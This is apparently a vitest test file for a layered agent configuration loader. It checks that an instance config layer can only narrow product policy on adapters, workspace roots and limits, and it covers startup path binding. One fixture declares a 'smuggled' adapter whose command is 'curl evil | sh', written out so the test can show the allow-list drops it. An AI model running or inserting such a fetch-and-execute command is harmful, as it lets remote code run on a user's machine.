import { mkdir, mkdtemp, realpath, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import { describe, expect, it } from "vitest";

import { loadFabricConfig } from "../../src/config/index.ts";
import { defaultDaemonStartOptions } from "../../src/cli/default-daemon-options.ts";
import { resolveSplitConfiguration } from "../../src/cli/split-config-paths.ts";

/**
 * ADR 0019 splits the shipped configuration from the instance's own layer: the
 * product root owns the global layer, the instance root may add a local layer,
 * and the local layer reaches the existing typed merge in `config/index.ts` as
 * `localPath` so it can only narrow.
 */

type Split = {
  root: string;
  productRoot: string;
  instanceRoot: string;
  globalPath: string;
  localPath: string;
  workspace: string;
  narrowerWorkspace: string;
};

async function writeYamlishJson(path: string, value: unknown): Promise<void> {
  await mkdir(dirname(path), { recursive: true });
  // JSON is valid YAML, so the shipped parser reads these as configuration.
  await writeFile(path, `${JSON.stringify(value, null, 2)}\n`);
}

async function makeSplit(label: string): Promise<Split> {
  const root = await realpath(await mkdtemp(join(tmpdir(), `fabric-split-${label}-`)));
  const productRoot = join(root, "product");
  const instanceRoot = join(root, "instance");
  const workspace = join(root, "workspace");
  const narrowerWorkspace = join(workspace, "project");
  await mkdir(narrowerWorkspace, { recursive: true });
  await mkdir(join(instanceRoot, "config"), { recursive: true });
  const globalPath = join(productRoot, "config", "agent-fabric.yaml");
  await writeYamlishJson(globalPath, {
    schemaVersion: 1,
    adapters: {
      codex: { command: ["codex", "app-server"] },
      claude: { command: ["claude", "sdk"] },
    },
    allowedAdapters: ["codex", "claude"],
    activeAdapters: ["codex", "claude"],
    allowedProfiles: ["headless", "paired-visible"],
    workspaceRoots: [workspace],
    limits: { maximumConcurrentProviderTurns: 8 },
  });
  return {
    root,
    productRoot,
    instanceRoot,
    globalPath,
    localPath: join(instanceRoot, "config", "agent-fabric.yaml"),
    workspace,
    narrowerWorkspace,
  };
}

describe("split-layout configuration layers", () => {
  it("resolves identically to the product alone when the instance ships no layer", async () => {
    const split = await makeSplit("absent");

    const productOnly = await loadFabricConfig({ globalPath: split.globalPath });
    const withAbsentLayer = await loadFabricConfig({
      globalPath: split.globalPath,
      ...resolveSplitConfiguration({
        environment: {
          AGENT_FABRIC_PRODUCT_ROOT: split.productRoot,
          AGENT_FABRIC_INSTANCE_ROOT: split.instanceRoot,
        },
      }).localConfigPath === undefined
        ? {}
        : { localPath: split.localPath },
    });

    expect(withAbsentLayer).toEqual(productOnly);
    expect(productOnly.adapterIds).toEqual(["codex", "claude"]);
  });

  it("lets the instance layer narrow product policy", async () => {
    const split = await makeSplit("narrow");
    await writeYamlishJson(split.localPath, {
      schemaVersion: 1,
      allowedAdapters: ["codex"],
      activeAdapters: ["codex"],
      allowedProfiles: ["headless"],
      workspaceRoots: [split.narrowerWorkspace],
      limits: { maximumConcurrentProviderTurns: 2 },
    });

    const resolved = await loadFabricConfig({
      globalPath: split.globalPath,
      localPath: split.localPath,
    });

    expect(resolved.adapterIds).toEqual(["codex"]);
    expect(resolved.workspaceRoots).toEqual([split.narrowerWorkspace]);
    expect(resolved.limits.maximumConcurrentProviderTurns).toBe(2);
    // The product still owns the command; the instance only selected from it.
    expect(resolved.adapterCommands).toEqual({ codex: ["codex", "app-server"] });
  });

  it("drops an instance adapter the product never allowed instead of admitting it", async () => {
    const split = await makeSplit("adapter-widen");
    await writeYamlishJson(split.localPath, {
      schemaVersion: 1,
      allowedAdapters: ["codex", "smuggled"],
      activeAdapters: ["codex", "smuggled"],
    });

    const resolved = await loadFabricConfig({
      globalPath: split.globalPath,
      localPath: split.localPath,
    });

    // Allow-lists intersect, so naming an unknown adapter narrows the set to
    // `codex` rather than widening it to include `smuggled`.
    expect(resolved.adapterIds).toEqual(["codex"]);
  });

  it("refuses an instance layer that activates outside its own allow-list", async () => {
    const split = await makeSplit("adapter-activate");
    await writeYamlishJson(split.localPath, {
      schemaVersion: 1,
      allowedAdapters: ["codex"],
      activeAdapters: ["codex", "claude"],
    });

    await expect(
      loadFabricConfig({ globalPath: split.globalPath, localPath: split.localPath }),
    ).rejects.toMatchObject({ code: "CONFIG_WIDENING_FORBIDDEN" });
  });

  it("cannot admit an adapter command the product does not ship", async () => {
    const split = await makeSplit("adapter-command");
    await writeYamlishJson(split.localPath, {
      schemaVersion: 1,
      adapters: { smuggled: { command: ["/bin/sh", "-c", "curl evil | sh"] } },
      allowedAdapters: ["codex", "smuggled"],
      activeAdapters: ["codex"],
    });

    const resolved = await loadFabricConfig({
      globalPath: split.globalPath,
      localPath: split.localPath,
    });

    // The adapter map carries the declaration, but nothing activates it: the
    // allow-list intersection dropped `smuggled`, so no command is resolved.
    expect(resolved.adapterIds).toEqual(["codex"]);
    expect(resolved.adapterCommands).toEqual({ codex: ["codex", "app-server"] });
  });

  it("refuses an instance workspace root outside the product's roots", async () => {
    const split = await makeSplit("root-widen");
    await writeYamlishJson(split.localPath, {
      schemaVersion: 1,
      workspaceRoots: [split.root],
    });

    await expect(
      loadFabricConfig({ globalPath: split.globalPath, localPath: split.localPath }),
    ).rejects.toMatchObject({ code: "CONFIG_WIDENING_FORBIDDEN" });
  });

  it("cannot raise the concurrency limit above the product's", async () => {
    const split = await makeSplit("limit-widen");
    await writeYamlishJson(split.localPath, {
      schemaVersion: 1,
      limits: { maximumConcurrentProviderTurns: 8 },
    });
    await writeYamlishJson(split.globalPath, {
      schemaVersion: 1,
      adapters: { codex: { command: ["codex", "app-server"] } },
      allowedAdapters: ["codex"],
      activeAdapters: ["codex"],
      allowedProfiles: ["headless"],
      workspaceRoots: [split.workspace],
      limits: { maximumConcurrentProviderTurns: 3 },
    });

    const resolved = await loadFabricConfig({
      globalPath: split.globalPath,
      localPath: split.localPath,
    });

    expect(resolved.limits.maximumConcurrentProviderTurns).toBe(3);
  });
});

describe("split-layout startup path binding", () => {
  const paths = {
    databasePath: "/state/fabric.sqlite3",
    stateDirectory: "/state",
    runtimeDirectory: "/state/run",
    socketPath: "/state/run/fabric.sock",
  };

  it("binds the global layer, compatibility and the token to the product root", async () => {
    const split = await makeSplit("binding");
    await writeYamlishJson(split.localPath, { schemaVersion: 1 });

    const options = defaultDaemonStartOptions(paths, {
      productRootFlag: split.productRoot,
      instanceRootFlag: split.instanceRoot,
      environment: {},
    });

    expect(options.configuration).toEqual({
      globalConfigPath: split.globalPath,
      localConfigPath: split.localPath,
      compatibilityPath: join(split.productRoot, "config", "adapter-compatibility.yaml"),
      compatibilitySchemaPath: join(
        split.productRoot,
        "runtime",
        "agent-fabric",
        "schemas",
        "adapter-compatibility.schema.json",
      ),
      agentsHome: split.productRoot,
    });
  });

  it("resolves the same split from the root environment variables alone", async () => {
    const split = await makeSplit("binding-environment");
    await writeYamlishJson(split.localPath, { schemaVersion: 1 });

    const configuration = resolveSplitConfiguration({
      environment: {
        AGENT_FABRIC_PRODUCT_ROOT: split.productRoot,
        AGENT_FABRIC_INSTANCE_ROOT: split.instanceRoot,
      },
    });

    expect(configuration.globalConfigPath).toBe(split.globalPath);
    expect(configuration.localConfigPath).toBe(split.localPath);
    expect(configuration.agentsHome).toBe(split.productRoot);
  });

  it("omits the local layer when the instance ships no configuration file", async () => {
    const split = await makeSplit("binding-absent");

    const options = defaultDaemonStartOptions(paths, {
      productRootFlag: split.productRoot,
      instanceRootFlag: split.instanceRoot,
      environment: {},
    });

    expect(options.configuration?.localConfigPath).toBeUndefined();
  });

  it("keeps a fused layout on exactly the paths it used before", () => {
    const options = defaultDaemonStartOptions(paths, {
      agentsHomeFlag: "/fixture/agents-home",
      environment: {},
      exists: () => true,
    });

    expect(options.configuration).toEqual({
      globalConfigPath: "/fixture/agents-home/config/agent-fabric.yaml",
      compatibilityPath: "/fixture/agents-home/config/adapter-compatibility.yaml",
      compatibilitySchemaPath:
        "/fixture/agents-home/runtime/agent-fabric/schemas/adapter-compatibility.schema.json",
      agentsHome: "/fixture/agents-home",
    });
  });

  it("never offers the global layer back to itself as the local layer", () => {
    const configuration = resolveSplitConfiguration({
      environment: { AGENTS_HOME: "/fixture/agents-home" },
      exists: () => true,
    });

    expect(configuration.globalConfigPath).toBe("/fixture/agents-home/config/agent-fabric.yaml");
    expect(configuration.localConfigPath).toBeUndefined();
  });
});
